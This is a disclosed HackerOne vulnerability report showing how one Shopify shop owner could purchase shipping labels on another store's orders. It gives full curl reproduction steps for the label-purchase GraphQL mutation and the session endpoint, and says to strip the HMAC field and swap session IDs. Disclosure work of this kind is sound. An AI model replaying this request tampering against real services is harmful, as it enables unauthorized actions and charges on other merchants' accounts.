# Ability to generate shipping labels in another store orders

## Report Details
- **Report ID**: 884159
- **URL**: https://hackerone.com/reports/884159
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-05-28T03:49:57.451Z
- **Disclosed**: 2020-08-19T17:58:58.924Z

## Reporter
- **Username**: imgnotfound
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Details
A shop owner creating a session on its own store on https://mailbox.shopifycloud.com/ service can craft request to print labels on another store he doesn't have access to.

## Steps to reproduce
1. Go to an unfulfilled order and click on **Create a shipping label**
2. Copy the CURL request that is being made to https://mailbox.shopifycloud.com/graphql/labels?sessionId={{sessionId}}. The payload should look like 
```
 curl 'https://mailbox.shopifycloud.com/graphql/labels?sessionId=4e8da4a36b' \
  -H 'authority: mailbox.shopifycloud.com' \
  -H 'cache-control: max-age=0' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'content-type: application/json' \
  -H 'accept: */*' \
  -H 'origin: https://fbeaudoinplus01.myshopify.com' \
  -H 'sec-fetch-site: cross-site' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'accept-language: en-US,en;q=0.9' \
  --data-binary $'{"query":"mutation PurchaseShippingLabels($shippingLabelPurchaseRequests:[ShippingLabelPurchaseRequestInput\u0021]\u0021){purchaseShippingLabels(shippingLabelPurchaseRequests:$shippingLabelPurchaseRequests){shippingLabelId status notices{code severity message shippingLabelId carrierCode serviceCode serviceName __typename}__typename}}","variables":{"shippingLabelPurchaseRequests":[{"shippingLabelId":"gid://shopify/ShippingLabel/522221879427", "hmac": "5TjRpa34as7d34OPPEhneeu4723=", "shippingRateSelection":{"carrierCode":"canada_post","serviceCode":"DOM.EP","serviceName":"Expedited Parcel","quotedCost":{"amount":7.91,"currencyCode":"CAD"},"shipmentOptions":[]},"destinationAddress":{"name":"Francis Beaudoinn","address1":"25-838 Rue Grandjean","address2":"","city":"Québec","province":"QC","postalCode":"G1X 3W5","country":"CA","phone":"","company":"&gt;"},"weight":0.00001,"weightUnit":"kg","selectedPackage":{"name":"Sample box","key":"gid://shopify/ShippingPackageV2/46497464451","type":"box","length":35,"width":26,"height":5,"dimensionUnit":"cm","weight":0,"weightUnit":"kg"},"lineItems":[{"lineItemId":"gid://shopify/LineItem/4975517728899","quantity":1}],"customsLineItems":[{"description":"test","quantity":1,"value":0,"weight":0,"weightUnit":"kg","countryOfOrigin":"","provinceOfOrigin":null,"hsCode":"","inventoryItemId":null}],"shippingDate":"2020-05-27","customerNotificationDate":"2020-05-27"}]},"operationName":"PurchaseShippingLabels"}' \
  --compressed
```

3. Void the shipping label
4. Re-open the order and click again on **Create a shipping label** and take note of the `shipping_label_ids` from the URL
5. We'll now re-send the request as the attacker, you'll need to use another shop Owner account (different shop). First of, we'll be initiating a session to the service by making the following request. Make sure to update the `{shop}` placeholder in the `Origin` header with your own shop name.
```
curl 'https://mailbox.shopifycloud.com/session/authentication' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: */*' \
  -H 'Origin: https://{shop}.myshopify.com' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  --compressed
```
From the response payload, copy the `redirectUrl` value and open it up in your browser. Click the install button then you should now be redirected to a page that contains a JSON payload i.e.: `{"id": "abc", "status":"success"}`. Take note of the `id` value.

6. From the CURL request in step 2:
 - Change the `gid://shopify/ShippingLabel/` object id with the one from Step 2
 - Change the `sessionId` query parameter to the previous step `id` value. i.e.: `abc`
 - Change the cookie `session` value to the same `id` value. i.e.: `abc`
 - Remove the `hmac` property from the payload

7. Send the CURL request and go back to the order, a new label has been generated.

## Demo
█████

## Impact

I am not sure of the impact as I didn't make too many tests except the one described here but at least, it demonstrates that an attacker is able to create a session on his own store and make requests to other stores he doesn't have access to.

## Attachments
No attachments
